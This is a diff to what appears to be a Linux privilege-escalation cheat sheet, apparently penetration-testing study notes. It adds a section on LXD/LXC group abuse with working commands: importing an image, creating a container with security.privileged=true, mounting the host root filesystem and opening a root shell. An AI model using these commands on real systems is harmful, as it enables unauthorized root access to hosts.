@@ -185,3 +185,36 @@ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 # monitor every seconed 
 pspy64 -pf -i 1000
 ```
+
+## Containers
+### Linux Containers
+- We can either create our own container and transfer it to the target system or use an existing container. 
+- we must be in either the lxc or lxd group
+- check [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
+```shell
+id
+
+uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
+```
+use an existing template
+```shell
+$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+$ lxc image list
+
++-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
+|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
++-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
+| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
++-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
+```
+- After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container.
+- This flag disables all isolation features that allow us to act on the host.
+```shell
+$ lxc init ubuntutemp privesc -c security.privileged=true
+$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+$ lxc start privesc
+$ lxc exec privesc /bin/bash
+
+# to access the contents of the root directory on the host type cd /mnt/root/root
+
+```
